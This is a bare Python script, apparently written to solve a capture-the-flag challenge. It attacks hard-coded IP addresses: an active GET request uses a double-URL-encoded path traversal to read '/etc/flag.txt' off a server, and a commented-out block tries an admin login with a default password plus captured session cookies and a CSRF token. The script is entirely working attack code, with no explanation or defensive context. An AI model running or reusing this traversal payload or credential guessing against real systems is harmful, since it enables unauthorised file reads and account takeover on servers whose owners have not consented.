import requests

"""
url = 'http://178.154.214.226:8002'
path = '/login'

csrf_token = 'IjIwODliYzYyMTI2NDJiYzNkMjk5NTM3MWVjYmM5MDQxN2RlMzgzYmYi.YFdBRA.mP-wDxW5kfCpWNs36TE-AWJ73jM'
next = ''
email = 'admin@sprush.rocks'
password = 'password'
my_email = "uekyylfkxbgybvtjwg@wqcefp.com"
my_password = "password"
cookie =  ".eJwlzjlqBDEQQNG7KHYgqTbVXKYp1YKNwYbumcj47m5w-H_0ftpRZ17v7fE8X_nWjo9ojyZirO4OHUcCzijdBtC5QElILSCDZWFtzrK5qbvKxLlSZrIVEId7DNLiEqCKTZBiKLBok0ydtIGNcRn2GhPBe1fYCds02g15XXn-awDu9uus4_n9mV_3yUj1EI85CHd0pkWqiYA-uuHqlRy1Rvv9Ay6AP54.YFdFbg.Rrf3YJXqvwaN_odybt5dMXrNhrM"
cookie2 = ".eJwlzjlqBDEQQNG7KHYgqTbVXKYp1YKNwYbumcj47m5w-H_0ftpRZ17v7fE8X_nWjo9ojyZirO4OHUcCzijdBtC5QElILSCDZWFtzrK5qbvKxLlSZrIVEId7DNLiEqCKTZBiKLBok0ydtIGNcRn2GhPBe1fYCds02g15XXn-awDu9uus4_n9mV_3yUj1EI85CHd0pkWqiYA-uuHqlRy1Rvv9Ay6AP54.YFdFxg.eYCX0One3ELIx3UmhE9MjcD_uYI"
myobj = {'csrf_token': csrf_token, 'next': next, 'email': email, 'password': password}

x = requests.post(url+path,  data=myobj)

print(x.text)"""

url = "http://178.154.210.156:8001/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/flag.txt"

x = requests.get(url)

print(x.text)
